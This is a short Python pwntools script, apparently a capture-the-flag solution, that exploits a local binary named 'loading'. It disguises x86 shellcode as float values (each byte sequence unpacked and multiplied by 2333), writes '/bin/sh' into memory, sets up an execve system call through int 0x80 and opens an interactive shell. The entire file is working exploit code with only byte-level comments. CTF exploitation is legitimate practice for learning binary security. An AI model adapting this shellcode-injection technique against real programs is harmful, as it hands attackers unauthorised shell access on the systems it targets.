#!/usr/bin/python 
from pwn import *
from struct import *
# context.log_level = 'debug'
p = process('loading')
def biu(sc):
    num = int(unpack('<f', sc)[0]* 2333)
    p.sendline(str(num))

for i in range(3):
	biu('\x00\x00\x00\x00')

biu('\x99\x89\xc3\x47')				# mov ebx, eax
biu('\x41\x44\x44\x44')				# nop/align

for c in '/bin/sh\x00':
	biu('\x99\xb0'+c+'\x47')		# mov al, c
	biu('\x57\x89\x03\x43')			# mov [ebx], eax; inc ebx

for i in range(8):
	biu('\x57\x4b\x41\x47')			# dec ebx

biu('\x99\x31\xc0\x47')				# xor eax, eax
biu('\x99\x31\xc9\x47')				# xor ecx, ecx
biu('\x99\x31\xd2\x47')				# xor edx, edx
biu('\x99\xb0\x0b\x47')				# mov al, 0xb
biu('\x99\xcd\x80\x47')				# int 0x80

p.sendline('done')
p.recvline()
p.interactive()